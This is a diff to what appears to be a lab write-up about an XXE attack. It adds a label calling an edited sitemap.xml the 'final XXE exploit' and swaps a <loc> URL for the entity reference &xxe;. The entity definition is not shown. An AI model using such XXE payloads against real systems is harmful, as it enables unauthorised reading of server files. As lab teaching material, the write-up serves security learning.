@@ -95,6 +95,7 @@ Once we make this change, we’ll save the file.
 
 Instead of overwriting the original, I highly recommend saving it as a separate file to preserve the original template in case something goes wrong.
 
+sitemap(final_exploit_file).xml :-    (i.e this is the content of final XXE exploit for this lab)
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 
@@ -113,7 +114,7 @@ Instead of overwriting the original, I highly recommend saving it as a separate 
 
     <url>
 
-        <loc>https://www.google.com/test</loc>
+        <loc>&xxe;</loc>
 
         <priority>1.0</priority>
 
